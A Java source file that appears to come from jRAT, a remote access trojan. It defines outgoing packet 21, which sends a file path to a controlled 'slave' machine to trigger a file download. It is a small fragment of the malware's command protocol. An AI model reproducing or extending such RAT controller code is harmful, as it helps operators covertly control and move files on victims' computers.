package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;

import java.io.DataOutputStream;


public class Packet21ServerDownloadFile extends AbstractOutgoingPacket {

	private String file;

	public Packet21ServerDownloadFile(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		System.out.println(file);
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 21;
	}

}
